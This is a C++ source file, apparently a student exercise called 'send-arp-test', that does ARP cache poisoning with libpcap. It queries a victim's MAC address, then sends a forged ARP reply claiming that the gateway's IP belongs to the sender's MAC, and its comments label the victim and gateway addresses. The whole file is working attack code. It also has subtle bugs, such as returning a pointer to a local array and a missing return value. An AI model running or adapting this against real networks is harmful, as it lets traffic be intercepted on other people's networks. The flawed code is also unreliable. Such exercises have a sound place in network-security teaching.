#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

int send_arp_packet(int type, char* dev, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(type == 1)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (type==2)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    else{
        printf("worng type error : [1]Request [2]Reply \n");
        return 1;
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

Mac receive_arp_packet(char* dev) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("packet_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            continue;
        }

        struct EthHdr* eth_hdr = (struct EthHdr*)(packet);
        struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet+14);

        if (ntohs(eth_hdr->type_) == 2054){
            return arp_hdr->smac_;
        }

    }
    pcap_close(handle);
}

unsigned char* getmac()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    unsigned char mac_address[6];

    if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
    return mac_address;
}

char* getip(char* dev)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

}

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> ... \n");
    printf("sample: send-arp-test wlan0 192.168.~.~ 192.168.~.~ \n");
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    // Take argv
    char* dev = argv[1];
    Ip sender_ip = std::string(argv[2]); //victim ip
    Ip target_ip = std::string(argv[3]); //gateway ip
    //Mac what_mac = Mac("ff:ff:ff:ff:ff:ff");
    Mac what_mac = Mac::broadcastMac();
    //Mac tmac = std::string("00:00:00:00:00:00");
    Mac tmac = Mac::nullMac();
    Mac my_mac = Mac(getmac());
    Ip my_ip = Ip(getip(dev));

    send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_ip);

    Mac sender_mac = Mac(receive_arp_packet(dev));

    send_arp_packet(2, dev, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip);

}
